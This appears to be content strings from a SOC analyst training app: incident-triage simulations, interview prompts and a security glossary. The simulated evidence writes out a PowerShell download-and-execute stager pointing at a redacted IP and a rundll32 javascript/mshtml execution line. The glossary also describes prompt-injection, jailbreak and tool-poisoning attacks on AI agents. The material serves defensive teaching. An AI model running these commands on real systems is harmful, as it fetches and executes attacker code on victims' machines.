Type exactly: selection_waf path|contains /manage* status 4xx — the probing selection.
Type exactly: selection_auth event 401 count by src_ip — the spray selection.
Type exactly: timeframe 10m correlation — bind the two selections in one window.
Write the false-positive note: which legitimate traffic (vulnerability scanners, partner monitoring) could trip this, and what exclusion you would add first.
Name the ATT&CK technique this rule covers in your notes.

checks.hint: Draft the WAF probing selection starting with: selection_waf.
Draft the auth spray selection starting with: selection_auth.

simulations.title: The rundll32 Sigma hit: true positive or admin?
simulations.brief: Your new Sigma rule 'Suspicious Rundll32 Execution' fired 14 times overnight across 6 hosts. Half look like admins, half do not. Triage the rule.

steps.symptom: 14 hits: rundll32.exe with no command-line arguments on some hosts, with javascript: and DLL payloads on others.
options: Split the signal: argument-less rundll32 is often benign (COM invocation), but rundll32 with script/DLL payloads is a classic LOLBin execution — triage by command line, parent process, and prevalence
All 14 are true positives — isolate every host
All 14 are false positives — disable the rule
Rundll32 is a Windows component and can never be malicious
evidence: sigma-hits.csv
8 hits: rundll32.exe (no args), parent svchost.exe, user SYSTEM — matches baseline. 6 hits: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ", parent winword.exe, user j.chen.
sigma-rule.yml
Rule as written: Image ENDWITH 'rundll32.exe' — no command-line condition. Fires on all invocations.
steps.explain: Detection engineering is signal shaping. The rule as written cannot distinguish COM plumbing from LOLBin abuse. The fix is in the rule: add command-line conditions so the benign pattern stops firing and the malicious pattern stays loud.

steps.symptom: The 6 malicious-pattern hits trace to a phishing email j.chen opened yesterday. What is the triage disposition?
options: Close as benign — the user seems fine
True positive, active intrusion: isolate the 6 hosts, reset j.chen's credentials, hunt for persistence and lateral movement from those hosts
Reimage just j.chen's workstation and move on
Wait for the EDR to handle it
evidence: edr.txt
winword.exe spawned rundll32 with network connections to 185.220.x.x. Follow-on: scheduled task 'Updater' created on 3 of 6 hosts.
steps.explain: LOLBin execution from a phishing parent with C2 and persistence is an active intrusion, not an alert to tune. Contain all affected hosts, kill the identity's sessions, and hunt outward — the rule did its job, now do yours.

steps.symptom: Intrusion contained. How do you improve the detection so this class fires cleaner next time?
options: Delete the Sigma rule — too noisy
Tune the rule: require suspicious command-line patterns, add parent-process context, map to MITRE T1218.011, and add a prevalence exception for the known-benign SYSTEM pattern
Set the rule to email the whole company on every hit
Only run the rule on weekends
evidence: tuned-rule.yml
detection: Image|endswith: 'rundll32.exe' AND CommandLine|contains: ['javascript:', '.dll,', 'shell32,ShellExec_RunDLL'] — plus filter for the benign SYSTEM/no-args baseline.
steps.explain: The detection lifecycle: idea -> rule -> tuning against real data -> ATT&CK mapping -> exception handling. Each iteration makes the signal sharper. Deleting the rule surrenders the visibility.

simulations.debrief: A Sigma rule is a hypothesis about attacker behavior. Triage tests the hypothesis against data, tuning sharpens it, and ATT&CK mapping tells you what coverage you actually bought. Noisy rules get tuned, not deleted.

simulations.title: Ransomware via the exposed remote portal
simulations.brief: The VPN portal — internet-facing, no MFA — shows successful logons from two foreign IPs at 04:00. An hour later, file shares start encrypting. This is initial access in progress.

steps.symptom: 04:02 and 04:07: successful VPN logons for m.alvarez from IPs in two different countries. 05:15: mass file renames to .locked on FS-01.
options: Ransomware initial access through the exposed portal: credential stuffing or password spray against a non-MFA VPN, now in the encryption phase
The user is traveling
A backup job encrypting files
Coincidence — the logons and the encryption are unrelated
evidence: vpn.log
04:02 login m.alvarez from 185.220.x.x (success, no MFA challenge). 04:07 login m.alvarez from 45.155.x.x (success). m.alvarez is on PTO in Ohio.
fs01.txt
05:15: 40,000 files renamed *.locked. Ransom note dropped: README_RESTORE.txt. Process: svchost.exe injected (hollowed).
steps.explain: Impossible-travel logons to a non-MFA portal followed by mass encryption is the ransomware playbook's opening chapters. The portal is the initial access vector; everything after is dwell and detonate.

steps.symptom: Encryption is spreading to FS-02. What is the correct containment sequence?
options: Pay the ransom to stop the spread
Isolate FS-01 and FS-02 from the network immediately, disable the VPN portal and m.alvarez's account, then assess backup integrity before any recovery
Shut down the entire data center
Delete the ransom note
evidence: playbook-ransomware.txt

Contain: sever infected hosts from the network (pull the cable / isolate in EDR), kill the access vector (portal + account), verify clean backups BEFORE restoring — restoring into an active intrusion re-encrypts.
steps.explain: Speed matters but order matters more: isolate the blast radius, kill the entry path, and prove your backups are clean before you touch recovery. Paying funds the next attack and does not guarantee decryption.

steps.symptom: Contained. The portal had no MFA because 'executives found it inconvenient.' What is the structural fix?
options: Put the portal behind MFA and conditional access, remove direct internet exposure where possible, and monitor impossible-travel as a detection
Change the VPN password monthly
Move the portal to a different port
Accept the risk — executives are happy
evidence: postmortem.txt
Root causes: internet-exposed auth without MFA, no impossible-travel detection, flat network let FS-02 fall in 20 minutes. All three are architectural, not user, failures.
steps.explain: Exposed portals without MFA are ransomware's favorite door. The fix is layered: strong auth on the door, less exposure of the door, and detection for when someone picks the lock anyway.

simulations.debrief: Ransomware is won or lost at initial access. Harden the portals (MFA, conditional access, minimal exposure), detect the spray (impossible travel, volume anomalies), and have a containment order rehearsed before the 4 AM call.

simulations.title: Where does the next detection dollar go?
simulations.brief: Your ATT&CK coverage map shows a gap: no visibility into T1078 (Valid Accounts) abuse, and weak coverage of T1059 (Command and Scripting Interpreter). Budget covers one project. Decide.

steps.symptom: Gap A (T1078): no impossible-travel, no impossible-time, no dormant-account-use detection. Gap B (T1059): PowerShell Script Block Logging off on 60% of fleet, no AMSI telemetry centralized.
options: Close the T1059 gap first: command-line visibility underpins detection of nearly every intrusion phase, and Script Block Logging is a config change, not a purchase
Close the T1078 gap first — valid accounts are the bigger threat
Split the budget across both and do each halfway
Buy a new tool that claims to cover both
evidence: coverage-map.txt
T1059 appears in 11 of the last 12 intrusions (execution, persistence, C2). T1078 appeared in 4. Script Block Logging: GPO change, zero license cost, 2-week rollout.
threat-intel.txt
Current ransomware affiliates lean heavily on PowerShell and LOLBins post-access; valid-account abuse usually follows, not precedes.
steps.explain: Risk-based prioritization: cover the technique the adversary uses most, at the lowest cost, first. Script Block Logging is the highest-ROI detection control in Windows — it turns every obfuscated command into evidence.

steps.symptom: T1059 project approved. How do you prove it worked?
options: Count the number of alerts
Measure with purple-team validation: execute the ATT&CK procedures safely, confirm the new telemetry fires, tune to a target false-positive rate, and track mean-time-to-detect on T1059 techniques
Ask the analysts if they feel safer
Wait for the next real intrusion
evidence: validation.txt
Atomic tests for T1059.001/.003: 14/14 detected post-rollout. FP rate: 3/day (tunable). MTTD on PowerShell abuse: 4h -> 11min.
steps.explain: Detection engineering without validation is hope. Adversary emulation proves the control fires, FP measurement proves it is livable, and MTTD proves it matters.

simulations.debrief: Spend detection budget like an investor: highest adversary usage, lowest implementation cost, validated with emulation. Coverage maps are portfolios — rebalance toward where the attacks actually are.

simulations.title: Encoded PowerShell at 2 AM
simulations.brief: EDR flags powershell.exe -EncodedCommand on three finance workstations at 02:00. It could be an admin script or an attack. Determine which.

steps.symptom: Three hosts, same encoded blob, parent process is OUTLOOK.EXE on two and svchost on one.
options: Malicious on the Outlook-parented hosts (phishing-delivered), investigate the svchost one separately — parent process is the discriminator
All benign — admins use encoded commands
All malicious — reimage all three immediately
Encoded commands are always malware
evidence: edr-detail.txt
Host FIN-01/02: parent OUTLOOK.EXE (macro-enabled doc opened 01:58). Host FIN-03: parent svchost.exe, command decodes to a known SCCM inventory script hash.
decoded.txt
FIN-01 blob decodes to: IEX (New-Object Net.WebClient).DownloadString('http://185.220.x.x/p') — a stager. FIN-03 blob: Get-WmiObject inventory collection, signed by IT.
steps.explain: Same technique, opposite verdicts — this is why parent process and payload matter more than the technique label. Outlook spawning encoded PowerShell that downloads a stager is an attack; SCCM's signed inventory script is Tuesday.

steps.symptom: FIN-01 and FIN-02 are compromised (stager downloaded, C2 beaconing). What is the hunt scope?
options: Just reimage the two workstations

Scope by the decoded infrastructure: hunt all hosts contacting the C2 domain/IP, all hosts with the same stager hash, and the mailbox that delivered the phish — then contain, eradicate, recover in order
Block the C2 IP and close the ticket
Reset every password in the company
evidence: hunt.txt
C2 185.220.x.x seen from FIN-01, FIN-02, and SRV-PRINT-01 (lateral movement). Stager hash on 4 hosts. Phish delivered to 12 mailboxes, 2 clicked.
steps.explain: Scope follows the attacker's infrastructure, not your initial alert count. The print server nobody looked at is the lateral movement that turns two workstations into a domain incident.

simulations.debrief: Living-off-the-land techniques are guilty until the context acquits them. Triage on parent process, payload, and prevalence — then scope the hunt by infrastructure, because attackers reuse theirs.

simulations.title: Blind during the incident: SIEM ingestion gap
simulations.brief: During an active intrusion investigation you discover the SIEM stopped ingesting EDR telemetry 6 hours ago. You are partially blind in the middle of a fight. Respond.

steps.symptom: EDR console shows current data; SIEM last EDR event 6 hours ago. The intrusion window overlaps the gap.
options: Continue the investigation in the EDR console directly while restoring the ingestion pipeline in parallel — never let a pipeline outage pause the hunt
Pause the investigation until the SIEM is fixed
Assume the gap means the attacker deleted the logs
Rebuild the SIEM from scratch
evidence: pipeline.txt
Forwarder cert expired 6h ago — mechanical failure, not tampering. EDR cloud console unaffected and current.
ir-note.txt
The hunt continues on native consoles during pipeline outages; the pipeline is restored as a parallel workstream.
steps.explain: Pipelines fail; investigations must not. Work the native console where the data lives, fix the forwarder in parallel, and verify it was mechanical (cert expiry) not adversarial (log tampering) — both look like gaps.

steps.symptom: Pipeline restored. How do you handle the 6-hour blind spot in the investigation record?
options: Ignore it — the data is backfilled automatically
Backfill the gap from the EDR console, document the blind window and its cause in the incident timeline, and add forwarder-cert monitoring so it pages before expiry
Pretend the gap did not happen
Close the incident — too much uncertainty
evidence: timeline.txt
Blind window 18:00–00:00 documented; backfilled via EDR export; no attacker activity found in window, stated as assessed-not-assumed. Monitoring added for cert expiry <30d.
steps.explain: An undocumented blind spot becomes a permanent doubt in the timeline. Backfill what you can, document what you cannot prove, and fix the monitoring so the next cert expiry pages a human instead of blinding the SOC.

simulations.debrief: Your detections are only as reliable as your pipelines. Monitor the monitors, hunt on native consoles during outages, and document every blind window — 'assessed, not assumed' is the standard.

behavioral.prompt: Tell me about the most technically difficult problem you have run into — a homelab, a broken environment, anything — and how you solved it.
points: Pick ONE problem with a real evidence trail: the symptom, what you measured, the hypothesis you tested
Show the loop: scope, observe, hypothesize, smallest safe change, validate — interviewers score the method, not just the fix
Name the tools (VM build, networking, logs) and the lesson it taught you
Close with the result in concrete terms: what works now that did not before
pitfalls: Choosing a story with no real obstacle (“I Googled it” is not a story)
Skipping validation — saying it worked without proving it
Rambling past two minutes without reaching the result

behavioral.prompt: Tell me about a time you dealt with a frustrated customer or user while something was broken.
points: Lead with empathy and ownership: acknowledge the impact before the technical detail
Show translation: what you told them, in their language, plus the timeline you committed to
Show judgment: the narrow fix you chose and what you refused to do (e.g., disabling the control to clear the symptom)
Close with the relationship outcome, not just the technical one
pitfalls: Badmouthing the customer to sound decisive
Promising a timeline you could not keep
Framing the user as the problem rather than the situation

points: Connect prevention to something concrete: a moment you saw detection arrive too late, or a system you hardened
Tie their model to your instincts: deny-by-default matches how you already think about trust
Show service orientation: the Cyber Hero culture rewards the 2 a.m. helper — give an example of being one
Name one forward-looking reason: Zero Trust, the MSP mission, or the bootcamp community investment
pitfalls: Generic flattery with no specifics about the company
Leading with compensation, title, or location convenience
Claiming expertise in products you have only read about — frame it as studied, not mastered
Staying vague ('I analyzed the data') instead of naming what you connected.
Skipping your own role: what did YOU see that others missed?
No outcome: what changed because you joined the dots?
points: The scattered signals and why nobody had connected them yet
The specific links you drew between them (shared host, time, infrastructure)
What the bigger picture turned out to be and what action it drove
What the experience taught you about investigating
behavioral.prompt: Tell me about a time you connected scattered clues into a bigger picture that others had missed.

pitfalls: Claiming you fixed everything: credibility comes from trade-offs, not heroics.
Hiding the constraint: the limitation is what makes the prioritization story real.
No metric: 'better' needs a before-and-after.
points: The constraint (time, budget, staff) and the size of the backlog
How you decided what mattered most (what was reachable, what was critical)
What you did first and what you deliberately deferred
The measurable result of the prioritization
behavioral.prompt: Describe a time you had to prioritize risks or fixes with limited time or resources. How did you decide what came first?

pitfalls: Reciting jargon to a non-technical audience and calling it communication.
Skipping the audience's reaction: did they actually understand and act?
Making yourself the hero instead of the translator.
points: The technical finding and why it mattered
Who the audience was and what they cared about
How you reframed it (a picture, an analogy, a story)
What decision or action the audience took because they understood
behavioral.prompt: Tell me about a time you explained a complex technical finding to a non-technical audience and it changed a decision.
Tell me about a time you used automation or AI to solve a security problem.
points: The repetitive security task and what it cost in analyst time
The automation or AI approach you built and how you validated it
Measured outcome: time saved, detection gained, false positives changed
pitfalls: Describing the tool but never the validation
No measurable outcome

behavioral.prompt: Describe a time you had to decide whether to trust an automated security decision.
points: The stakes of the automated action and its blast radius
How you verified before acting (or the gate you built)
What happened and what you would automate differently next time
pitfalls: Saying you always trust the tool
No mention of blast radius or reversibility

sections.heading: Rule strength (strongest to weakest)
items: Certificate/publisher rules — survive version updates
Hash rules — precise but break on every new version
Path rules — weakest; never in user-writable locations
Learning Mode catalogs before enforcement; Installation Mode pauses blocking — scope and time-box both

sections.heading: Terminal evidence commands
items: nmap <host> — which ports answer (22/80/443 open)
dig <name> — ANSWER SECTION with the A record
ss — listening sockets
systemctl status <svc> — unit state
journalctl -u <svc> — service logs
sha256sum <file> — real SHA-256 identity
grep <pattern> <file> — search the record
ps — what is actually running

sections.heading: Graph vocabulary
items: node — any entity tracked in the model (user, host, IP, domain, file hash, vulnerability)
edge — a labeled relationship between two nodes (logged into, resolved to, downloaded)
degree — number of edges on a node; high-degree nodes are attacker highways
centrality — how much traffic or how many paths flow through a node
directed edge — a relationship with a direction (A downloaded FROM B)
security graph — the living model of your whole environment as nodes and edges
attack graph — the subgraph of exploitable paths to your targets
knowledge graph — threat-intel indicators linked to campaigns and actors

sections.heading: Attack-graph playbook
items: inventory first — you cannot graph what you have not discovered
model flaws AND misconfigs as exploit edges
compute shortest paths to the crown jewels
find the choke point (highest betweenness on those paths)
break the path: patch, segment, or remove the edge
re-scan and re-run the graph to prove the path is gone
never trust yesterday's graph — redeployments redraw the map

sections.heading: Zero Trust + graphs
items: never trust, always verify — re-evaluate every access decision
assume breach — treat unexpected edges as hostile until proven otherwise
microsegmentation — allow-list approved edges, alert on new ones
ReBAC — policies are path queries on the identity graph
continuous verification — device/location/behavior edges change, trust follows
anomalous edge — a first-seen connection between strangers is the classic signal

sections.heading: ML detection vocabulary
items: Supervised learning — learns from labeled examples; strong on known threats, blind to novel ones
Unsupervised learning — finds structure without labels; clustering and dimensionality reduction
Anomaly detection — models 'normal' and flags deviations; the workhorse for novel threats
UEBA — user and entity behavior analytics: per-user baselines plus peer-group comparison
Feature engineering — encoding raw logs into model inputs (login velocity, rare processes, domain entropy)
Concept drift — model decay as attacker behavior and legitimate traffic shift over time

sections.heading: Detection metrics
items: Precision — of all flagged alerts, how many were real
Recall — of all real attacks, how many were flagged
Threshold tuning — sliding the decision cutoff trades precision against recall
Alert fatigue — when false positives train analysts to ignore the queue
DGA — domain generation algorithm; detected via character entropy of domain names

sections.heading: Agent and LLM security
items: Direct prompt injection — attacker input overrides app instructions (OWASP LLM01:2025, the #1 LLM risk)
Indirect prompt injection — hidden instructions inside retrieved data (email, web, docs)
Jailbreak — defeating the model's own safety policy; distinct from hijacking app behavior
Tool poisoning — malicious tool descriptions or metadata steer an agent to misuse its tools (MCP ecosystem risk)
Insecure output handling — executing or trusting model output without validation
Least-privilege tools — grant each tool only the scope its task requires

sections.heading: Adversarial ML and governance
items: Evasion — perturbing inputs at inference time to dodge a classifier
Poisoning — corrupting training data to corrupt the model
Extraction — querying a model to steal its behavior or parameters
MITRE ATLAS — knowledge base of adversarial ML tactics and techniques
Red-teaming and evals — adversarial testing of AI systems before deployment
Human-in-the-loop — required approval for high-impact or irreversible agent actions
SOAR — security orchestration, automation and response; automate enrichment, gate containment

glossary.def: Default-deny execution control: only explicitly approved applications, scripts, and installers may run.
Default-allow model: everything runs except recognized-bad items — the window zero-days live in.
Deny-by-default posture: unknown code, devices, or connections are refused unless explicitly approved.
Containment applied on top of allowlisting; restricts what a permitted app may do across app-to-app, file, registry, and network dimensions.
Agent mode that catalogs applications and dependencies and auto-builds policies before enforcement; temporarily disables file blocking.
Temporary mode that pauses file blocking for installs — must be tightly scoped and time-boxed.
Grants specific approved applications admin rights for standard users — just-in-time, per-app, time-boxed — without standing admin rights.
An elevated or trusted process spawning another tool (e.g., PowerShell) to inherit its privileges — countered by ringfencing the elevated process.
Device and path policy: USB approved by serial, user, file type, time, and encryption; unapproved devices do not connect.
Centrally managed host firewall; rules by port, source IP, and dynamic ACLs; egress allowlisting pins apps to approved destinations.
Zero Trust Network Access: per-session, per-application brokered connections (commonly over port 443) with no open inbound ports — deny-by-default for network access.
Portal queue where end-user software requests arrive for admin review and decision.
Real-time audit showing what was allowed or denied across endpoints — and why; the evidence layer for triage.
One-button cloud VDI sandbox launched from an approval request; logs AV flags, canary-file access, and registry/system changes.
24/7/365 US-based managed detection and response team; validates alerts, isolates hosts, acts on customer runbooks; ~60-second average response.
Design and operate as if the attacker already has a foothold — least privilege, containment, and monitoring everywhere.
Attacks that hijack trusted built-in tools (Word, PowerShell) instead of dropping malware — defeated by behavior containment, not signatures.
Scoped, ticketed, tested changes with validation and rollback — emergency speed never cancels the process.
A node in an attack graph representing a system or weakness, connected by edges that represent steps an attacker could take between them.
How central a node is to paths through the graph (for example, betweenness: how many shortest paths cross it).
The most valuable assets in the environment (customer data, finance systems, source code): what attack paths are measured against.
A labeled connection between two nodes, representing a relationship such as 'logged into' or 'resolved to'.
A graph of threat indicators (IPs, domains, hashes) linked to campaigns, actors, and each other through shared infrastructure.
The practice of mapping relationships in data to reveal hidden associations; rooted in Euler's 1736 graph theory, 1970s paper link charts, and post-2001 intelligence work.
A segment of the network so small that its allowed communications can be enumerated as a graph of approved edges.
An entity in the graph: a user, host, IP address, domain, file, or vulnerability.
Access control where policy is evaluated by traversing relationships on a graph (for example: user reports_to manager who owns the resource's project).
A machine-learning model that operates directly on graph structure to classify nodes or subgraphs, for example labeling attack vs normal behavior.
Monitoring user and entity behavior by modeling their normal relationship patterns and flagging structural anomalies.
ML trained on labeled examples; classifies new inputs into known categories.
ML approach that models normal behavior and flags statistically rare deviations.
Turning raw telemetry into numeric model inputs, e.g. login velocity or domain entropy.
Share of flagged alerts that were real; the false-positive economics of the queue.
Share of real attacks the detector flagged; the miss rate's complement.
Decay of model performance as the data distribution shifts over time.
Attacker-crafted instructions that override an LLM application's intended behavior; direct (user input) or indirect (retrieved data).
Crafted input that defeats an LLM's own safety policy or refusal behavior.
Malicious tool descriptions or metadata that manipulate an AI agent into misusing its tools.
Failing to validate LLM output before acting on it, e.g. executing generated commands.
Adversarial ML technique: perturbing inputs to cross a classifier's decision boundary.
Adversarial Threat Landscape for AI Systems; MITRE's knowledge base of AI attack tactics.
Security orchestration, automation and response; playbooks that enrich automatically and gate containment on humans.
Required human approval before high-impact or irreversible automated actions.
